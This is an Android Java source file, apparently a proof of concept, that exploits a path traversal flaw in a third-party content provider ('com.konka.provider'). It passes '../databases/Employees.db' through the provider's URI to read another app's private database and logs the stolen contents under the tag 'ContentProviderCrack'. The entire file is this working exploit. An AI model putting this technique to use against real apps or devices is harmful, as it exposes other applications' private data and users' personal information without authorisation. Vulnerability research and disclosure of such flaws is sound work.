package helloworld.fk500.com.testfileprovider;

import android.content.ContentResolver;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String uri = "content://com.konka.provider/" + "../databases/Employees.db";

        try {
            ContentResolver cr = this.getContentResolver();
            FileInputStream in = (FileInputStream)cr.openInputStream(Uri.parse(uri));
            byte[] buffer = new byte[1024];
            in.read(buffer);
            Log.i("ContentProviderCrack","The content of file is:" + new String(buffer));

            }

        catch (Exception e){
            Log.i("ContentProviderCrack","error");
        }
    }
}
